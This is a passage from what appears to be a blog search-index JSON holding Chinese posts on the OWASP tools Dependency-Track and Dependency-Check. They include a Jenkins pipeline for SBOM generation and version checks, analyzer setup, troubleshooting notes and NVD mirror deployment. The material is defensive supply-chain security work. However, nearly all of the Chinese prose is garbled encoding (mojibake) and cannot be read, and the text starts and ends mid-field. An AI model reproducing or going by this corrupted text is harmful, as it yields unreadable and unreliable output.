æƒé™ï¼šåˆ›å»ºé¡¹ç›®éœ€è¦PROJECT_CREATION_UPLOADæƒé™ï¼ŒæŸ¥çœ‹resultç»“æœéœ€è¦VULNERABILITY_ANALYSISå’ŒVIEW_VULNERABILITYç­‰ï¼Œå»ºè®®å¯æ·»åŠ å…¨éƒ¨æƒé™ã€‚\n\n\nè¿›é˜¶ç”¨æ³•\n\n\nä½¿ç”¨è´¨é‡é—¨é˜ˆå€¼æ§åˆ¶ï¼ŒåŒDC\nEnable synchronous publishing modeåŒæ­¥å‘å¸ƒæ¨¡å¼å°†BOMå‘å¸ƒåˆ°DTå¹¶è¿”å›ä¾èµ–è·Ÿè¸ªå¤„ç†çš„ç»“æœ\nPublish Dependency-Check resultså…¬å¼€ä¾èµ–å¤„ç†çš„ç»“æœ\nä½¿ç”¨pipelineå¤„ç†ï¼šimport hudson.model.*;\nimport hudson.*\nimport groovy.json.JsonSlurper;\n\npipeline &#123;\n    agent any\n\n    tools &#123;\n        &#x2F;&#x2F; maven &#39;maven&#39;\n        &#x2F;&#x2F;maven &#39;maven-apollo&#39;\n        maven maven\n        git &#39;Default&#39;\n        jdk &#39;jdk&#39;\n        &#x2F;&#x2F; nodejs &#39;node&#39;\n\n    &#125;\n         \n    stages &#123;\n        stage(&#39;åˆ é™¤ä¸Šæ¬¡æ„å»º&#39; )&#123;\n            steps &#123;\n               \n                sh &#39;rm -rf *&#39;\n                \n                wrap([$class: &#39;BuildUser&#39;]) &#123;\n                  \n                   script&#123;\n                       buildName &quot;#$&#123;projectName&#125;-$&#123;BRANCH&#125;-$&#123;env.BUILD_USER&#125;&quot;   \n\n                   &#125;\n                &#125;\n                \n            &#125;\n        &#125;\n        \n        stage(&#39;æ‹‰å–ä»£ç &#39;)&#123;\n            steps &#123;\n                echo &#39;ä»£ç åˆ†æ”¯:&#39;+BRANCH\n                echo &#39;ä»£ç åœ°å€:&#39; +GIT_URL\n                git branch: BRANCH, credentialsId: &#39;0eeb53a0-0390-41a4-9ac2-8d4c4c5c884f&#39;, url: GIT_URL\n                \n            &#125;\n        &#125;\n\n       \n        stage(&#39;build&#39;) &#123;\n         steps &#123;\n                sh &#39;&#39;&#39;\n                    mvn clean install -e -U -DskipDockerPush -DdockerImageTags&#x3D;latest -Dmaven.test.skip&#x3D;true $mvn_params -f pom.xml\n                    \n                &#39;&#39;&#39;\n             &#125;\n         &#125;\n         \n        stage(&#39;Generating SBOM with Cyclonedx&#39;) &#123;\n            steps &#123;\n                sh &#39;mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom&#39;\n            &#125;\n        &#125;\n        \n        stage(&#39;å®‰å…¨åˆè§„æ£€æŸ¥&#39;)&#123;\n            steps &#123;\n                script &#123;\n                    def jsonPayload &#x3D; new File(&quot;$WORKSPACE&#x2F;target&#x2F;bom.json&quot;).text\n                    def slurper &#x3D; new JsonSlurper()\n                    def states &#x3D; slurper.parseText(jsonPayload)\n                    def components &#x3D; states.components\n                    def checks &#x3D; [&#39;org.apache.shiro:shiro-spring&#39;:&#39;1.9.1&#39;]\n                    def fail_components &#x3D; &quot;&quot;\n                    for (component in components)&#123;\n                        def dep_name &#x3D; component.group + &quot;:&quot; + component.name\n                        \n                        if (dep_name in checks)&#123;\n                            current_version &#x3D; component.version\n                            \n                            check_version &#x3D; checks.get(dep_name)\n                            String[] current_version_chars &#x3D; current_version.split(&#39;\\\\.&#39;)\n                            String[] check_version_chars &#x3D; check_version.split(&#39;\\\\.&#39;)\n                            \n                            \n                            for(int i&#x3D;0; i&lt;current_version_chars.size(); i++)&#123;\n                                curr &#x3D; Integer.parseInt(current_version_chars[i])\n                                check &#x3D; Integer.parseInt(check_version_chars[i])\n                                if (curr &lt; check)&#123;\n                                    fail_components +&#x3D; component.group + &quot;:&quot; + component.name + &quot;ç‰ˆæœ¬è¿‡ä½ï¼Œå½“å‰ç‰ˆæœ¬ä¸ºï¼š&quot; + component.version + &quot;ï¼Œåº”ä¸ä½äº&quot; + check_version + &quot;\\n&quot;\n                                    break\n                                &#125;\n                            &#125;\n                        &#125;\n                        \n                    &#125;\n                    if(fail_components !&#x3D; &quot;&quot;)&#123;\n                        println(fail_components)\n                        error &quot;å®‰å…¨åˆè§„æ£€æŸ¥å¤±è´¥ï¼Œè¯·å‡çº§ç‰ˆæœ¬ï¼ï¼ï¼&quot;\n                    &#125;\n                &#125;\n            &#125;\n        &#125;\n        \n        \n        stage(&#39;dependencyTrackPublisher&#39;) &#123;\n            steps &#123;\n                withCredentials([string(credentialsId: &#39;dt&#39;, variable: &#39;API_KEY&#39;)]) &#123;\n                    dependencyTrackPublisher artifact: &#39;target&#x2F;bom.xml&#39;, projectName: projectName, projectVersion: branch, \\\n                                            autoCreateProjects: true, dependencyTrackApiKey:API_KEY, synchronous: true, \\\n                                            failedNewCritical : 10000, failedNewHigh : 10000, failedNewLow: 10000, failedNewMedium: 10000, \\\n                                            failedTotalCritical : 10000, failedTotalHigh : 10000, failedTotalLow : 10000, failedTotalMedium : 10000,\n                                            unstableNewCritical : 10000, unstableNewHigh : 10000, unstableNewLow : 10000, unstableNewMedium : 10000,\\\n                                            unstableTotalCritical : 10000, unstableTotalHigh : 10000,unstableTotalLow : 10000, unstableTotalMedium : 10000\n                &#125;\n            &#125;\n        &#125;\n        \n    &#125;\n\n&#125;\n\n\n\n\nusageAnalyzersåˆ†æåŠŸèƒ½æ”¯æŒå››ç§åˆ†ææ–¹å¼ï¼š\n\ninternal:é»˜è®¤å¼€å¯ï¼Œç”¨äºNVDå’ŒVulnDBçš„åœ¨çº¿åˆ†æ\nNPM Auditï¼šé»˜è®¤å¼€å¯ï¼Œnode.jsçš„åœ¨çº¿äº‘æœåŠ¡\nSonatype OSS Indexï¼šé»˜è®¤å…³é—­ï¼Œéœ€è¦é…ç½®ï¼š\nVulnDBï¼šé»˜è®¤å…³é—­ï¼Œéœ€è¦é…ç½®\n\nSonatype OSS Indexsonatypeå…è´¹æ³¨å†Œ,æ³¨å†Œåå°†æ³¨å†Œé‚®ç®±å’ŒAPItokené›†æˆåˆ°deployment-trackã€‚sonatypeæ”¯æŒä¸Šç™¾ä¸‡ä¸­ç»„ä»¶çš„æœç´¢ï¼Œå¯ä»¥é€šè¿‡Â REST APIè¿›è¡Œä¾èµ–æ‰«æï¼ŒåŒæ—¶sonatypeè¿˜æä¾›ä¸€æ¬¾GitHub APPï¼ŒSonatype Lift Â· GitHub Marketplace Â· GitHubåœ¨æ¯æ¬¡æ¥å–è¯·æ±‚æ—¶æ ‡è®°æ¼æ´ã€åœ¨ä»£ç reviewæ—¶æŠ¥å‘Šæ‰¾çš„é«˜é£é™©issueã€‚\nVulnDBVulnDBé…ç½®æ–‡æ¡£æ”¯æŒä¸¤ç§æ–¹å¼ï¼š\n\né€šè¿‡VulnDB REST APIè¿›è¡Œåˆ†æAPIæ–‡æ¡£ä¸­æœªæ‰¾åˆ°Consumer key å’ŒConsumer secretï¼Œä½¿ç”¨api keyå’Œç”¨æˆ·åè¿›è¡Œé…ç½®ï¼Œå¯èƒ½å­˜åœ¨é—®é¢˜ã€‚\nä½¿ç”¨VULnDB é•œåƒæ•°æ®åº“åˆ†æä¸‹è½½å¹¶å®‰è£…VulnDBé•œåƒGitHub - stevespringett&#x2F;vulndb-data-mirror: A simple Java command-line utility to mirror the entire contents of VulnDB.vulndb-data-mirror.sh \\\n    --consumer-key mykey \\\n    --consumer-secret mysecret \\\n    --dir &quot;~&#x2F;.dependency-track&#x2F;vulndb&quot;\n\næ¼æ´æ¥æºæ¼æ´æ¥æºä¸»è¦æ˜¯ï¼š\n\nNVDï¼šé»˜è®¤å¼€å¯ï¼Œåœ¨çº¿feedsåœ°å€\nGithub Advisories:é»˜è®¤å…³é—­ï¼Œéœ€è¦é…ç½®ã€‚GitHubPATé…ç½®æ–‡æ¡£Creating a personal access token - GitHub Docsã€‚\n\nRepositoriesé»˜è®¤ä¸éœ€è¦é…ç½®ï¼Œæ·»åŠ äº†å†…éƒ¨ç§ä»“Nexus Repository Manager\né€šçŸ¥æ·»åŠ webhook-slackæ·»åŠ webhookï¼Œä½†æ˜¯æ²¡æœ‰æ¶ˆæ¯æé†’ã€‚templateä¸­çš„JSONæ ¼å¼ä¸æ»¡è¶³slackçš„æ¶ˆæ¯æ ¼å¼ã€‚Creating rich message layouts | Slack\næ·»åŠ mailAPI\ntrouble-shoutingsmtp![[2022-08-08_å‘¨ä¸€#DT é€šçŸ¥åŠŸèƒ½é…ç½®é—®é¢˜]]\nè¯·æ±‚å®ä¾‹å¤ªå¤§æŠ¥é”™ä¿¡æ¯ï¼š\n[DependencyTrack] Publishing artifact to Dependency-Track - [http:&#x2F;&#x2F;dt-api.kubegems.io:32126](http:&#x2F;&#x2F;dt-api.kubegems.io:32126&#x2F;)\n[DependencyTrack] An error occurred connecting to Dependency-Track - HTTP response code: 413 Request Entity Too Large\n[DependencyTrack] &lt;html&gt;&lt;head&gt;&lt;title&gt;413 Request Entity Too Large&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;center&gt;&lt;h1&gt;413 Request Entity Too Large&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;&lt;hr&gt;&lt;center&gt;nginx&#x2F;1.19.9&lt;&#x2F;center&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;\nä¿®æ”¹è·¯ç”±é…ç½®ï¼Œæ·»åŠ annotationAdvanced Configuration with Annotations | NGINX Ingress Controller\n# é»˜è®¤1m é”®å€¼å¯¹\nnginx.org&#x2F;client-max-body-size 100m\n# anotations\n annotations:\n    nginx.org&#x2F;client-max-body-size: 100m\n\nIOé˜»å¡\n\nQ:jenkins pipeline jobe push sbom.xml 2 dt timeout.\nA:åˆ†ææ—¥å¿—apiserver-logã€‚Jenkins jobå¤±è´¥æ—¶é—´æœ€æ—©å‘ç”Ÿåœ¨17:18åˆ†é’Ÿï¼Œä½†æ˜¯åº”ç”¨æ—¥å¿—åªæœ‰ä»17:36åˆ†å¼€å§‹è®°å½•çš„ä¿¡æ¯ã€‚åˆæ­¥åˆ†æå¯èƒ½æ˜¯2022-09-06 17:53:58,790 ERROR [ServerRuntime$Responder] An I/O error has occurred while writing a response message entity to the container output stream.org.glassfish.jersey.server.internal.process.MappableException: org.eclipse.jetty.io.EofExceptionæ—¢-çŸ­æ—¶é—´å†…å¤§é‡çš„å¹¶å‘è¯·æ±‚åˆ°APIserverçš„æŸäº›æ¥å£ï¼Œæ¥å£å¤„ç†è¶…æ—¶å¯¼è‡´èµ„æºè€—å°½å¼•å‘é˜»å¡ã€‚å¯èƒ½æƒ…å†µ1ï¼šæ¼æ´åº“æ›´æ–°ä»»åŠ¡å æ®äº†å¤§é‡IOï¼Œé€šè¿‡æ—¥å¿—åˆ†æï¼š\n\nNistMirrorTask download ç”¨æ—¶18710ms\nNistMirrorTask parse ç”¨æ—¶5023970ms\nNistMirrorTask æ€»ç”¨æ—¶5062313msï¼ˆçº¦1.4å°æ—¶ï¼‰\nGitHubAdvisoryMirrorTaskæ€»ç”¨æ—¶497066msï¼ˆçº¦1.6åˆ†é’Ÿå¯å¿½ç•¥ï¼‰å¯èƒ½æƒ…å†µ2ï¼špush SBOMå¤§é‡å¹¶å‘é•¿è¯·æ±‚ï¼Œå¯¼è‡´APIserverç½‘ç»œé˜»å¡ã€I&#x2F;Oè¿‡è½½\nJenkins å¯¹æ¥DTç”¨åˆ°äº†putæ–¹æ³•publishing SBOMï¼Œ\njenkinsä½¿ç”¨Enable synchronous publishing modeåŒæ­¥å‘å¸ƒæ¨¡å¼å°†BOMå‘å¸ƒåˆ°DTå¹¶è¿”å›ä¾èµ–è·Ÿè¸ªå¤„ç†çš„ç»“æœï¼Œå¯èƒ½åœ¨NistMirrorTask GitHubAdvisoryMirrorTask  MetricsUpdateTaskååŒæ­¥æ›´æ–°ä¿¡æ¯A:è§£å†³æ€è·¯\n ç”³è¯·æœåŠ¡å™¨éƒ¨ç½²waråŒ…çš„æ–¹å¼éƒ¨ç½²ï¼ˆä»¥åŠé›†ç¾¤éƒ¨ç½²ï¼Ÿï¼‰\n æ›´æ¢MySQLæ•°æ®åº“\n ç°æœ‰K8Så®¹å™¨ç¯å¢ƒä¸­è®¾ç½®æ—¶åŒºï¼Œè®¾ç½®æ¼æ´åº“æ›´æ–°æ—¶é—´ï¼Œæ‰©å®¹å‰¯æœ¬ âœ… 2022-09-07 æ·»åŠ key:TZ value:Asia&#x2F;Shanghai\n æä¸ªissue âœ… 2022-09-07\n ä¿®æ”¹Jenkinstimeoutå‚æ•°\n\nQï¼šotherERROR [LoggableUncaughtExceptionHandler] An unknown error occurred in an asynchronous event or notification thread Â· Issue #1059 Â· DependencyTrack&#x2F;dependency-track Â· GitHubè¿‘1å‘¨èµ„æºç›‘æ§ä¿¡æ¯é‡å¯podåçš„èµ„æºç›‘æ§ä¿¡æ¯é‡å¯åçš„æ—¥å¿—\nReferencesGitHub - AppThreat&#x2F;cdxgen: Creates CycloneDX Software Bill-of-Materials (SBOM) for your projects from source and container images. Supports many languages and package managers. Integrate in your CI&#x2F;&#x2F;CD pipeline with automatic submission to Dependency Track server.GitHub - CycloneDX&#x2F;cyclonedx-cli: CycloneDX CLI tool for SBOM analysis, merging, diffs and format conversions.Site Unreachableæ·±åº¦è§£è¯» |ã€Šæ„å»ºè½¯ä»¶ç»„ä»¶é€æ˜åº¦ï¼šå»ºç«‹é€šç”¨çš„è½¯ä»¶ç‰©æ–™æ¸…å•ï¼ˆSBOMï¼‰ã€‹ï¼ˆä¸Šï¼‰OWASP Dependency-Track | Jenkins pluginä½¿ç”¨Jenkinsæ–°å»ºå¹¶é…ç½®ä¸€ä¸ªæœ¬åœ°é¡¹ç›®JenkinsæŒç»­é›†æˆdemoGitHub | Jenkins pluginOWASP Dependency-Track PluginåŸºäºå¼€æºå·¥å…·å®ç°è½¯ä»¶æˆåˆ†åˆ†æSCA - å…ˆçŸ¥ç¤¾åŒºåŸºäº Dependency-Track æ„å»ºå…è´¹çš„ç¬¬ä¸‰æ–¹ç»„ä»¶å®‰å…¨ç®¡ç†å¹³å° - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å°\n","slug":"dependency-track","date":"2022-06-23T09:38:36.281Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"SCA,SBOM,OWASP,éƒ¨ç½²æ‰‹å†Œ,dependency-track,è½¯ä»¶ä¾›åº”é“¾","author_index":"Moses"},{"id":"520e1d6d52856a91475d0b89567aa470","title":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨åˆ†æå·¥å…·-Dependency-Check","content":"dependency-check0x01ç®€ä»‹Dependency-Checkæ˜¯OWASPï¼ˆOpen Web Application Security Projectï¼‰çš„ä¸€ä¸ªå®ç”¨å¼€æºç¨‹åºï¼Œç”¨äºè¯†åˆ«é¡¹ç›®ä¾èµ–é¡¹å¹¶æ£€æŸ¥æ˜¯å¦å­˜åœ¨ä»»ä½•å·²çŸ¥çš„ï¼Œå…¬å¼€æŠ«éœ²çš„æ¼æ´ã€‚ç›®å‰ï¼Œå·²æ”¯æŒJavaã€.NETã€Rubyã€PHPã€Node.jsã€Pythonç­‰è¯­è¨€ç¼–å†™çš„ç¨‹åºï¼Œå¹¶ä¸ºC&#x2F;C++æ„å»ºç³»ç»Ÿï¼ˆautoconfå’Œcmakeï¼‰æä¾›äº†æœ‰é™çš„æ”¯æŒã€‚è€Œä¸”è¯¥å·¥å…·è¿˜æ˜¯OWASP Top 10çš„è§£å†³æ–¹æ¡ˆçš„ä¸€éƒ¨åˆ†ã€‚\nDependency-Checkæ”¯æŒé¢å¹¿ï¼ˆæ”¯æŒå¤šç§è¯­è¨€ï¼‰ã€å¯é›†æˆæ€§å¼ºï¼Œä½œä¸ºä¸€æ¬¾å¼€æºå·¥å…·ï¼Œåœ¨å¤šå¹´æ¥çš„å‘å±•ä¸­å·²ç»æ”¯æŒå’Œè®¸å¤šä¸»æµçš„è½¯ä»¶è¿›è¡Œé›†æˆï¼Œæ¯”å¦‚ï¼šå‘½ä»¤è¡Œã€Antã€Mavenã€Gradleã€Jenkinsã€Sonarç­‰ï¼›å…·å¤‡ä½¿ç”¨æ–¹ä¾¿ï¼Œè½åœ°ç®€å•ç­‰ä¼˜åŠ¿ã€‚\n\né¡¹ç›®åœ°å€\nå®˜ç½‘\nDocs\n\nDependency Checkæœ‰ä¸‰ç§ä½¿ç”¨æ–¹å¼ï¼š\nä»å‘½ä»¤è¡Œä½¿ç”¨ï¼šæ­¤æ—¶Dependency Checkä½œä¸ºä¸€ä¸ªå•ç‹¬çš„è½¯ä»¶ï¼Œä¸é¡¹ç›®æ— å…³ï¼Œä½¿ç”¨æ—¶åªéœ€æŒ‡å®šéœ€è¦æ‰«æçš„é¡¹ç›®ä½ç½®å³å¯ã€‚åœ¨ä¸šåŠ¡ä¸Šçº¿æµç¨‹ä¸­æ¨èä½¿ç”¨æ­¤æ–¹å¼  \nä½œä¸ºæ’ä»¶åœ¨é¡¹ç›®ä¸­ä½¿ç”¨ï¼šæ­¤æ—¶éœ€è¦åœ¨é¡¹ç›®çš„é…ç½®æ–‡ä»¶ä¸­åšç›¸å…³å†…å®¹æ·»åŠ ï¼Œåªå¯¹å½“å‰é¡¹ç›®æœ‰æ•ˆã€‚åˆ«çš„é¡¹ç›®éœ€è¦ä½¿ç”¨æ—¶ï¼Œéœ€è¦é‡æ–°ä¿®æ”¹é…ç½®æ–‡ä»¶  \nä½œä¸ºAnt Taskä½¿ç”¨ï¼šè¿™ç§æ–¹å¼çš„ä½¿ç”¨ä»‹äºä»¥ä¸Šä¸¤è€…ä¹‹é—´ï¼Œå¯ä»¥åœ¨å¤šä¸ªé¡¹ç›®ä¸­ä½¿ç”¨ï¼Œä½†æ˜¯éœ€è¦å®‰è£…ï¼Œå¹¶ä¸”éœ€è¦åœ¨é¡¹ç›®çš„build.xmlä¸­æ·»åŠ ç›¸å…³é…ç½®ã€‚\n\n0x02å®ç°åŸç†ä¾èµ–æ€§æ£€æŸ¥å¯ç”¨äºæ‰«æåº”ç”¨ç¨‹åºï¼ˆåŠå…¶ä¾èµ–åº“ï¼‰ï¼Œæ‰§è¡Œæ£€æŸ¥æ—¶ä¼šå°† Common Platform Enumeration (CPE)ç¾å¸å›½å®¶æ¼æ´æ•°æ®åº“åŠNPM Public Advisoriesåº“ä¸‹è½½åˆ°æœ¬åœ°ï¼Œå†é€šè¿‡æ ¸å¿ƒå¼•æ“ä¸­çš„ä¸€ç³»åˆ—åˆ†æå™¨æ£€æŸ¥é¡¹ç›®ä¾èµ–æ€§ï¼Œæ”¶é›†æœ‰å…³ä¾èµ–é¡¹çš„ä¿¡æ¯ï¼Œç„¶åæ ¹æ®æ”¶é›†çš„ä¾èµ–é¡¹ä¿¡æ¯ä¸æœ¬åœ°çš„CPE&amp;NPMåº“æ•°æ®è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœæ£€æŸ¥å‘ç°æ‰«æçš„ç»„ä»¶å­˜åœ¨å·²çŸ¥çš„æ˜“å—æ”»å‡»çš„æ¼æ´åˆ™æ ‡è¯†ï¼Œæœ€åç”ŸæˆæŠ¥å‘Šè¿›è¡Œå±•ç¤ºã€‚\nä¾èµ–é¡¹æ£€æŸ¥çš„å·¥ä½œåŸç†æ˜¯æ”¶é›†æœ‰å…³å…¶æ‰«æçš„æ–‡ä»¶çš„ä¿¡æ¯ï¼ˆä½¿ç”¨åˆ†æå™¨ï¼‰ã€‚æ”¶é›†çš„ä¿¡æ¯ç§°ä¸ºè¯æ®ï¼›æ”¶é›†çš„è¯æ®æœ‰ä¸‰ç§ç±»å‹ï¼šä¾›åº”å•†ã€äº§å“å’Œç‰ˆæœ¬ã€‚ä¾‹å¦‚ï¼ŒJarAnalyzerå°†ä»æ¸…å•ã€pom.xmlå’Œæ‰«æçš„JARæ–‡ä»¶ä¸­çš„è½¯ä»¶åŒ…åç§°ä¸­æ”¶é›†ä¿¡æ¯ï¼Œå¹¶å…·æœ‰å¯å‘å¼æ–¹æ³•å°†æ¥è‡ªå„ç§æ¥æºçš„ä¿¡æ¯æ”¾å…¥ä¸€ä¸ªæˆ–å¤šä¸ªè¯æ®æ¡¶ä¸­ã€‚åœ¨NVD CVEæ•°æ®ï¼ˆæ¨¡å¼å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ï¼‰ä¸­ï¼Œæ¯ä¸ªCVEæ¡ç›®éƒ½æœ‰ä¸€ä¸ªæ˜“å—æ”»å‡»çš„è½¯ä»¶åˆ—è¡¨ï¼š\n&lt;entry id&#x3D;&quot;CVE-2012-5055&quot;&gt;\n  ...\n    &lt;vuln:vulnerable-software-list&gt;\n      &lt;vuln:product&gt;cpe:&#x2F;a:vmware:springsource_spring_security:3.1.2&lt;&#x2F;vuln:product&gt;\n      &lt;vuln:product&gt;cpe:&#x2F;a:vmware:springsource_spring_security:2.0.4&lt;&#x2F;vuln:product&gt;\n      &lt;vuln:product&gt;cpe:&#x2F;a:vmware:springsource_spring_security:3.0.1&lt;&#x2F;vuln:product&gt;\n    &lt;&#x2F;vuln:vulnerable-software-list&gt;\n  ...\n  &lt;&#x2F;entry&gt;\nåœ¨NVD CVEæ•°æ®åº“ä¸­ï¼Œæ¯ä¸ªCVEæ¡ç›®éƒ½æœ‰ä¸€ä¸ªæ˜“å—æ”»å‡»çš„è½¯ä»¶åˆ—è¡¨ã€‚è¿™äº›CPEæ¡ç›®è®°å½•äº†â€œCPE:&#x2F;å…¥å£ç±»å‹:ä¾›åº”å•†:äº§å“:ç‰ˆæœ¬:ä¿®è®¢:â€¦â€è¿™äº›å±æ€§ã€‚è¿™äº›æ•°æ®è¢«æ”¶é›†å¹¶å­˜å‚¨åœ¨Luceneç´¢å¼•ä¸­ã€‚ç„¶åä½¿ç”¨æ‰€æ”¶é›†çš„è¯æ®ï¼Œå¹¶å°è¯•åŒ¹é…Lucene CPEç´¢å¼•ä¸­çš„æ¡ç›®ã€‚å¦‚æœæ‰¾åˆ°ï¼ŒCPEAnalyzeråˆ†æå™¨å°†å‘ä¾èµ–é¡¹æ·»åŠ æ ‡è¯†ç¬¦ï¼Œå¹¶éšåæ·»åŠ åˆ°æŠ¥å‘Šä¸­ã€‚ä¸€æ—¦ç¡®å®šäº†CPEï¼Œå°±å°†å…³è”çš„CVEæ¡ç›®æ·»åŠ åˆ°æŠ¥å‘Šä¸­ã€‚è¿™äº›è¯æ®åœ¨å†™å…¥æŠ¥å‘Šçš„æ—¶å€™ä¼šè¢«åˆ†çº§ä½¿ç”¨ä¸åŒçš„ä¿¡å¿ƒçº§åˆ«â€”â€”ä½ã€ä¸­ã€é«˜å’Œæœ€é«˜ã€‚å®ƒç­‰äºåœ¨è¯†åˆ«è¿‡ç¨‹ä¸­ä½¿ç”¨çš„è¯æ®çš„æœ€ä½æ°´å¹³çš„ä¿¡å¿ƒæ°´å¹³ã€‚å¦‚æœç”¨äºè¯†åˆ«æŸä¸ªCPEçš„ä¸€ç³»åˆ—è¯æ®ä¸­ä¿¡å¿ƒç­‰çº§æœ€ä½çš„è¯æ®æ˜¯é«˜çº§ï¼Œé‚£ä¹ˆï¼Œé‚£ä¹ˆCPEå°†æ‹¥æœ‰é«˜çº§çš„ä¿¡å¿ƒæ°´å¹³ã€‚\n0x03Quickstartmacbrew update &amp;&amp; brew install dependency-check\nä¸‹è½½å®‰è£…Â GitHub Release\nç¼–è¯‘å®‰è£…-ç•¥usageå‘½ä»¤è¡Œä½¿ç”¨Command Line Argumentsdependency-check â€“advancedHelpåŒ…æ‹¬ä½¿ç”¨æœ¬åœ°æ•°æ®åº“ã€åˆ¶æˆå“åº“æ‰«æç­‰\næ”¯æŒçš„æ–‡ä»¶dependency-check â€“ File Type Analyzersdependency-checkæ”¯æŒå¤šç§æ ¼å¼çš„æ–‡ä»¶ï¼šZip archive format (*.zip, *.ear, *.war, *.jar, *.sar, .apk,Â .nupkg); Tape Archive Format (.tar); Gzip format (.gz,Â .tgz); Bzip2 format (.bz2, *.tbz2)ã€‚\nç¤ºä¾‹ç¬¬ä¸€æ¬¡ä½¿ç”¨,éœ€è¦ä¸‹è½½æ¼æ´åº“\n ç”Ÿæˆæ‰«ææŠ¥å‘Š: Dependency-checkæ”¯æŒå¤šç§è¾“å‡ºæ ¼å¼ï¼Œé»˜è®¤æ˜¯HTMLæ ¼å¼ã€‚åœ¨å‘½ä»¤å¼æ–¹å¼ä½¿ç”¨æ—¶ï¼ŒæŒ‡å®šå‚æ•°â€“formatæ¥é€‰å®šæ ¼å¼ï¼Œå¯ä»¥æœ‰XML, HTML, CSV, JSON, VULN, ALLè¿™äº›é€‰é¡¹ï¼ˆå¿…é¡»æ˜¯å¤§å†™ï¼‰ã€‚                                                               \næ‰«æç»“æœå¯¹æ¯” [[OpenSCA#æµ‹è¯•å¯¹æ¯”]]\næ’ä»¶ä½¿ç”¨\nMaven:Â mvn -versionÂ 3.5.0 and higher\nMavenå‘½ä»¤æ–¹å¼:\nmvn org.owasp:dependency-check-maven:check\næŸ¥è¯¢æŸä¸€ä¸ªä¾èµ– mvn dependency:list|grep -i &quot;log4j*&quot;\nmvn dependency:tree\nèšåˆæŸ¥è¯¢ mvn clean org.owasp:dependency-check-maven:aggregate -Dformat=HTML\néœ€è¦åœ¨mavençš„é¡¹ç›®ä¾èµ–ä½ æ·»åŠ dependency-checkçš„ä¾èµ–å¦‚ä¸‹ï¼š &lt;project&gt;\n    &lt;build&gt;\n        &lt;plugins&gt;\n            ...\n            &lt;plugin&gt;\n              &lt;groupId&gt;org.owasp&lt;&#x2F;groupId&gt;\n              &lt;artifactId&gt;dependency-check-maven&lt;&#x2F;artifactId&gt;\n              &lt;executions&gt;\n                  &lt;execution&gt;\n                      &lt;goals&gt;\n                          &lt;goal&gt;check&lt;&#x2F;goal&gt;\n                      &lt;&#x2F;goals&gt;\n                  &lt;&#x2F;execution&gt;\n              &lt;&#x2F;executions&gt;\n            &lt;&#x2F;plugin&gt;\n            ...\n        &lt;&#x2F;plugins&gt;\n        ...\n    &lt;&#x2F;build&gt;\n    ...\n&lt;&#x2F;project&gt;\n\nantä½¿ç”¨ ç•¥ dependency-check-ant â€“ Configuration\n0x04 æ¼æ´åº“æœ¬åœ°å®‰è£…åï¼Œä¼šç¼“å­˜NVDæ•°æ®åº“ï¼Œä¸»è¦æ˜¯ä¸¤ä¸ªæ–‡ä»¶jsrepository.jsonå’Œodc.mv.db\næ­å»ºæœ¬åœ°NVD Mirroråº“éœ€æ±‚\nä¼ä¸šä¸­å†…ç½‘ç¯å¢ƒå¯èƒ½CIæœåŠ¡å™¨ä¸ä¼šå¼€æ”¾å¯¹å¤–ç½‘çš„è®¿é—®æƒé™ï¼Œéœ€è¦æ­å»ºä¸€ä¸ªæœ¬åœ°çš„NVDMirror\néœ€è¦äºŒæ¬¡å¼€å‘\n\næ‰‹åŠ¨æ­å»ºnvdå®˜æ–¹æä¾›äº†å¯¹åº”jaråŒ…æ¥ä½œä¸ºmirrorçš„æœåŠ¡GitHub - stevespringett&#x2F;nist-data-mirror: A simple Java command-line utility to mirror the CVE JSON data from NIST.\n\nä¸‹è½½release jaråŒ…Site Unreachable\næ‰§è¡Œjava -jar nist-data-mirror.jar\næ­å»ºApacheæœåŠ¡\nå®šæ—¶ä»»åŠ¡æ›´æ–°jsreponsitory.jsondependency-check â€“ Snapshotting the NVD\nå®¢æˆ·ç«¯ä½¿ç”¨è®¾ç½®å‚æ•°å¦‚ä¸‹--cveUrlModified http:&#x2F;&#x2F;ä½ çš„æœ¬åœ°æœåŠ¡å™¨:30006&#x2F;nvdcve-1.1-modified.json.gz\n--cveUrlBase http:&#x2F;&#x2F;ä½ çš„æœ¬åœ°æœåŠ¡å™¨:30006&#x2F;nvdcve-1.1-modified.json.gz\njenkins pipelineä¿®å¤mirroråœ°å€dependencyCheck additionalArguments: &#39;--cveUrlModified http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;nvdcve-1.1-2019.json.gz --cveUrlBase http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;nvdcve-1.1-2019.json.gz &#39;, odcInstallation: &#39;dependency-check&#39;\n\ndockeræ­å»º$ mvn clean package\n$ docker build --rm -t sspringett&#x2F;nvdmirror .\n$ mkdir target&#x2F;docs\n$ docker run -dit \\\n  --name mirror \\\n  -p 80:80 \\\n  --mount type&#x3D;bind,source&#x3D;&quot;$(pwd)&quot;&#x2F;target&#x2F;docs&#x2F;,target&#x3D;&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;htdocs \\\n  sspringett&#x2F;nvdmirror\n\nk8séƒ¨ç½²# æ‰“åŒ…ï¼Œ**éœ€è¦chartmusuem**\n# cd to charts directory\n$ cd nist-data-mirror\n\n# Create directory for package\n$ mkdir .&#x2F;target\n\n# Package helm chart\n$ helm package --app-version &lt;app_version&gt;  --version &lt;helm_chart_version&gt; -destination .&#x2F;target .\n\n# As a best practice, push your packaged chart to helm repo. e.g. push it to artifactory, chartmusuem etc.\n$ helm push target&#x2F;nist-data-mirror-&lt;helm_chart_version&gt;.tgz chartmuseum\n# éƒ¨ç½²\n# helm install --name &lt;release_name&gt; &lt;helm_repo&gt;&#x2F;&lt;chart_name&gt;\n$ helm install --name nist-data-mirror chartmuseum&#x2F;nist-data-mirror\n\nMysql å­˜å‚¨nvd æ•°æ®ç›®å‰æ”¯æŒçš„æ•°æ®åº“åŒ…æ‹¬ï¼šh2ã€mysqlã€oracleã€sql 